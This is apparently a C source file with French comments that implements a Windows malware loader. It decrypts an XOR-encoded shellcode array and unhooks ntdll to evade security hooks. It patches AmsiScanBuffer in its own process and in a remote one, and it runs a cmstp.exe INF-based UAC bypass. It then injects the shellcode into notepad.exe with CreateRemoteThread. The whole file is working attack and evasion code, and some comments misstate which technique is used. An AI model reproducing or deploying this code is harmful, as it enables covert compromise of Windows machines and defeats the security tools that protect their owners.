#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

unsigned char shellcode[] = {
    0xbd, 0xfb, 0xfc, 0x26, 0xb1, 0x5b, 0xb3, 0xc2, 0x41, 0xb3, 0x3e, 0x93, 0x00, 0xe3,
    0x2d, 0x8a, 0x70, 0x61, 0x2e, 0x94, 0x24, 0xfb, 0xf4, 0x90, 0x21, 0xfb, 0xf4, 0x90,
    0x59, 0xfb, 0xf4, 0x90, 0x61, 0xfb, 0x70, 0x75, 0x0b, 0xfb, 0x37, 0x49, 0x33, 0xe3,
    0x3e, 0x7b, 0x0a, 0x4e, 0x36, 0x5f, 0x09, 0x82, 0xbf, 0x6e, 0x7d, 0xd2, 0x03, 0xc0,
    0x6d, 0x93, 0x3e, 0x03, 0x88, 0xbe, 0x3e, 0xc3, 0x80, 0x51, 0x92, 0x90, 0x00, 0xe2,
    0x37, 0x49, 0x13, 0x93, 0xf4, 0x80, 0x7d, 0xfb, 0x7e, 0x12, 0x27, 0x32, 0x07, 0xda,
    0x4a, 0xb1, 0x70, 0x47, 0x2e, 0xb3, 0x7f, 0xc2, 0xca, 0x33, 0xf7, 0xc2, 0x41, 0xb3,
    0x37, 0x47, 0x81, 0xc7, 0x1b, 0x8a, 0x40, 0x63, 0x2f, 0x86, 0xca, 0xf3, 0x5f, 0x8b,
    0x40, 0x63, 0xf4, 0x8a, 0x59, 0x50, 0x2c, 0x8a, 0xbe, 0x7a, 0x3b, 0x49, 0x0d, 0x97,
    0x77, 0x83, 0xca, 0x87, 0xf7, 0x8a, 0x40, 0x65, 0x37, 0xf3, 0x81, 0x1f, 0x3e, 0x03,
    0x88, 0xbe, 0x3e, 0xc3, 0x80, 0x8b, 0x9f, 0xb7, 0xb0, 0xf6, 0x46, 0x13, 0x34, 0x68,
    0x27, 0x86, 0xca, 0xf3, 0x5b, 0x8b, 0x40, 0x63, 0x19, 0x83, 0xca, 0xbf, 0x37, 0x86,
    0xca, 0xf3, 0x63, 0x8b, 0x40, 0x63, 0x3e, 0x49, 0x45, 0x3b, 0x3e, 0x9a, 0x09, 0xb2,
    0xaf, 0x83, 0x19, 0xed, 0x26, 0x98, 0x00, 0xeb, 0x3e, 0x9b, 0x00, 0xe9, 0x37, 0x41,
    0xad, 0x93, 0x3e, 0x90, 0xbe, 0x53, 0x27, 0x83, 0x18, 0xe9, 0x37, 0x49, 0x53, 0x5a,
    0x34, 0x3d, 0xbe, 0x4c, 0x22, 0x8b, 0xff, 0xc4, 0x0c, 0xf0, 0x1e, 0x80, 0x4d, 0xc2,
    0x41, 0xf2, 0x29, 0x8b, 0xc8, 0x55, 0x37, 0x43, 0xad, 0x13, 0x7e, 0xc2, 0x41, 0xfa,
    0xf6, 0x27, 0x08, 0x0f, 0x7d, 0xc2, 0x50, 0xef, 0xbf, 0x6a, 0x79, 0xd5, 0x3e, 0x96,
    0x08, 0x3a, 0x9b, 0x8e, 0xc8, 0x42, 0x3e, 0x78, 0x37, 0x37, 0xae, 0xb2, 0xbe, 0x66,
    0x33, 0x4b, 0xab, 0xdb, 0x7e, 0xc3, 0x41, 0xb3, 0x26, 0x83, 0xfb, 0x92, 0x17, 0xc7,
    0x7a, 0x4c, 0xaa, 0xa8, 0x4b, 0xf2, 0x21, 0x92, 0x11, 0xfe, 0x4e, 0x0b, 0x0c, 0x82,
    0xbf, 0x8a, 0xbe, 0x73, 0x37, 0x4b, 0x83, 0xfb, 0x80, 0x02, 0x09, 0x3a, 0xbe, 0x83,
    0xfb, 0x51, 0x88, 0xba, 0x5a, 0x4c, 0xaa, 0x8a, 0xc8, 0x74, 0x15, 0xd2, 0x00, 0xeb,
    0x33, 0x4b, 0xa3, 0xfb, 0xf6, 0x3b, 0x00, 0x09, 0x41, 0xe0, 0x66, 0x96, 0x80, 0x17,
    0xc4, 0x73, 0x0b, 0xc8, 0x08, 0x4c, 0xb1, 0xb7, 0xa4, 0x5b, 0xec, 0xc2, 0x41, 0xb3,
    0x37, 0x41, 0xad, 0xa3, 0x37, 0x4b, 0xa3, 0xfe, 0x4e, 0x0b, 0x2b, 0xb7, 0x3e, 0x9a,
    0x09, 0x3a, 0x86, 0x83, 0xfb, 0x58, 0xd4, 0x07, 0xee, 0x4c, 0xaa, 0x41, 0xb9, 0xb3,
    0x01, 0x97, 0x09, 0x30, 0xbb, 0xe2, 0x1f, 0x3a, 0x89, 0xa8, 0x01, 0xf2, 0x26, 0xaa,
    0x41, 0xa3, 0x7f, 0xc2, 0x00, 0xeb, 0x37, 0x4b, 0xb3, 0xfb, 0x4e, 0x0b, 0x00, 0x09,
    0xfd, 0x73, 0xbf, 0xfd, 0x80, 0x17, 0x09, 0x3a, 0xbc, 0x8b, 0xc8, 0x74, 0x32, 0xf3,
    0x88, 0xfa, 0xf6, 0x32, 0x09, 0x3a, 0xa5, 0x8a, 0xc8, 0x4a, 0x3e, 0x78, 0xaa, 0x18,
    0xba, 0x6d, 0xbe, 0x66, 0xfc, 0x3a, 0x41, 0xce, 0x57, 0x9a, 0x00, 0xe4, 0x26, 0xaa,
    0x41, 0xf3, 0x7f, 0xc2, 0x00, 0xeb, 0x15, 0xc2, 0x1b, 0xf2, 0xc5, 0x7e, 0xd6, 0x53,
    0x9e, 0x3d, 0x94, 0xe4, 0x26, 0x83, 0xfb, 0x23, 0x4c, 0xc8, 0x50, 0x4c, 0xaa, 0x8b,
    0xbe, 0x7d, 0x96, 0xfe, 0xbe, 0x4c, 0x80, 0x8a, 0x40, 0x70, 0x37, 0xeb, 0x87, 0xfb,
    0xfa, 0x34, 0x34, 0x07, 0x3e, 0x3d, 0xa6, 0xeb, 0x15, 0xc2, 0x18, 0xf2, 0xc5, 0x60,
    0x5f, 0xc7, 0x77, 0x3d, 0x94,
};



// ── Typedefs ──────────────────────────────────────────────────────────────────
typedef LONG    (WINAPI *pRegCreateKeyExA_t)(HKEY, LPCSTR, DWORD, LPSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
typedef LONG    (WINAPI *pRegSetValueExA_t)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
typedef LONG    (WINAPI *pRegCloseKey_t)(HKEY);
typedef LONG    (WINAPI *pRegDeleteKeyA_t)(HKEY, LPCSTR);
typedef HINSTANCE (WINAPI *pShellExecuteA_t)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);
typedef LPVOID  (WINAPI *pVirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *pVirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE  (WINAPI *pCreateThread_t)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD   (WINAPI *pWaitForSingleObject_t)(HANDLE, DWORD);
typedef HANDLE  (WINAPI *pOpenProcess_t)(DWORD, BOOL, DWORD);
typedef LPVOID  (WINAPI *pVirtualAllocEx_t)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *pWriteProcessMemory_t)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE  (WINAPI *pCreateRemoteThread_t)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

// ── Déchiffrement XOR ────────────────────────────────────────────────────────
void dechiffrer(unsigned char *sc, int taille) {
    unsigned char key[] = {0x41, 0xB3, 0x7F, 0xC2};
    for (int i = 0; i < taille; i++)
        sc[i] ^= key[i % 4];
}

// ── Trouver PID ──────────────────────────────────────────────────────────────
DWORD getPID(const char *processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("CreateToolhelp32Snapshot a echoue : %lu\n", GetLastError());
        return 0;
    }
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hSnapshot, &pe)) {
        printf("Process32First a echoue : %lu\n", GetLastError());
        CloseHandle(hSnapshot);
        return 0;
    }
    do {
        if (_stricmp(pe.szExeFile, processName) == 0) {
            printf("Trouve : %s (PID %lu)\n", pe.szExeFile, pe.th32ProcessID);
            CloseHandle(hSnapshot);
            return pe.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &pe));
    printf("Aucun process nomme '%s' trouve\n", processName);
    CloseHandle(hSnapshot);
    return 0;
}

// ── NTDLL Unhooking ───────────────────────────────────────────────────────────
void unhookNtdll() {
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    LPVOID pCleanNtdll = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pCleanNtdll;
    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((BYTE*)pCleanNtdll + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);

    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (memcmp(pSection->Name, ".text", 5) == 0) {
            DWORD oldProtect;
            VirtualProtect((BYTE*)hNtdll + pSection->VirtualAddress,
                pSection->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
            memcpy((BYTE*)hNtdll + pSection->VirtualAddress,
                   (BYTE*)pCleanNtdll + pSection->VirtualAddress,
                   pSection->Misc.VirtualSize);
            VirtualProtect((BYTE*)hNtdll + pSection->VirtualAddress,
                pSection->Misc.VirtualSize, oldProtect, &oldProtect);
            break;
        }
        pSection++;
    }
    UnmapViewOfFile(pCleanNtdll);
    CloseHandle(hMap);
    CloseHandle(hFile);
}

// ── UAC Bypass (eventvwr) ─────────────────────────────────────────────────────

#include <objbase.h>

void uacBypass() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    typedef UINT (WINAPI *pWinExec_t)(LPCSTR, UINT);
    pWinExec_t myWinExec = (pWinExec_t)GetProcAddress(hKernel32, "WinExec");

    char tmpPath[MAX_PATH], infPath[MAX_PATH], launchCmd[512];
    GetTempPathA(MAX_PATH, tmpPath);
    sprintf(infPath, "%sgl.inf", tmpPath);

    // Format INF corrigé — ,1 obligatoire
    const char *infContent =
        "[version]\r\n"
        "Signature=$chicago$\r\n"
        "AdvancedINF=2.5\r\n\r\n"
        "[DefaultInstall]\r\n"
        "CustomDestination=CustInstDestSectionAllUsers\r\n\r\n"
        "[DefaultInstall_SingleUser]\r\n"
        "RunPreSetupCommands=Commands,1\r\n\r\n"
        "[Commands]\r\n"
        "cmd /c start powershell.exe\r\n\r\n"
        "[Strings]\r\n"
        "ServiceName=\"\"\r\n"
        "ShortSvcName=\"\"\r\n";

    HANDLE hFile = CreateFileA(infPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    DWORD written;
    WriteFile(hFile, infContent, strlen(infContent), &written, NULL);
    CloseHandle(hFile);
    printf("[*] INF ecrit : %s\n", infPath);

    sprintf(launchCmd, "C:\\Windows\\System32\\cmstp.exe /ni /s \"%s\"", infPath);
    printf("[*] Cmd : %s\n", launchCmd);

    UINT ret = myWinExec(launchCmd, SW_SHOWNORMAL);  // visible pour debug
    printf("[*] WinExec ret = %u (>31 = OK)\n", ret);

    Sleep(5000);
    DeleteFileA(infPath);
}
void amsiBypass() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) { printf("[AMSI] non chargee\n"); return; }

    FARPROC pScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pScanBuffer) { printf("[AMSI] AmsiScanBuffer introuvable\n"); return; }

    // Patch : mov eax, 0x80070057 (E_INVALIDARG) ; ret
    // → AMSI croit que les arguments sont invalides → skip le scan
    unsigned char patch[] = {0x48, 0x31, 0xC0, 0xB0, 0x57, 0xC3};

    DWORD oldProtect;
    VirtualProtect(pScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(pScanBuffer, patch, sizeof(patch));
    VirtualProtect(pScanBuffer, sizeof(patch), oldProtect, &oldProtect);

    printf("[AMSI] AmsiScanBuffer patche !\n");
}
void patchAmsiInRemote(HANDLE hProcess) {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    FARPROC pScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pScanBuffer) { printf("[AMSI] remote: introuvable\n"); return; }

    unsigned char patch[] = {0x48, 0x31, 0xC0, 0xB0, 0x57, 0xC3};
    DWORD oldProtect;
    SIZE_T written;

    VirtualProtectEx(hProcess, pScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    WriteProcessMemory(hProcess, pScanBuffer, patch, sizeof(patch), &written);
    VirtualProtectEx(hProcess, pScanBuffer, sizeof(patch), oldProtect, &oldProtect);

    printf("[AMSI] Patche dans notepad.exe !\n");
}

// ── Main ──────────────────────────────────────────────────────────────────────
int main() {
    unhookNtdll();
    amsiBypass();   // 1. Déhooker NTDLL avant tout
    uacBypass();     // 2. UAC bypass via eventvwr

    DWORD pid = getPID("notepad.exe");
    if (pid == 0) {
        printf("Erreur : notepad.exe introuvable\n");
        return 1;
    }
    printf("PID notepad.exe : %lu\n", pid);

    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    pOpenProcess_t        myOpenProcess        = (pOpenProcess_t)       GetProcAddress(hKernel32, "OpenProcess");
    pVirtualAllocEx_t     myVirtualAllocEx     = (pVirtualAllocEx_t)    GetProcAddress(hKernel32, "VirtualAllocEx");
    pWriteProcessMemory_t myWriteProcessMemory = (pWriteProcessMemory_t)GetProcAddress(hKernel32, "WriteProcessMemory");
    pCreateRemoteThread_t myCreateRemoteThread = (pCreateRemoteThread_t)GetProcAddress(hKernel32, "CreateRemoteThread");
    pWaitForSingleObject_t myWaitForSingleObject = (pWaitForSingleObject_t)GetProcAddress(hKernel32, "WaitForSingleObject");

    printf("1. Ouverture du process...\n");
    
    HANDLE hProcess = myOpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    patchAmsiInRemote(hProcess);
    printf("2. Allocation memoire...\n");
    LPVOID pMem = myVirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    printf("3. Ecriture du shellcode...\n");

    dechiffrer(shellcode, sizeof(shellcode));   

    myWriteProcessMemory(hProcess, pMem, shellcode, sizeof(shellcode), NULL);

    DWORD oldProtect;
    VirtualProtectEx(hProcess, pMem, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProtect);

    printf("4. Creation du thread distant...\n");
    HANDLE hThread = myCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pMem, NULL, 0, NULL);
    myWaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}
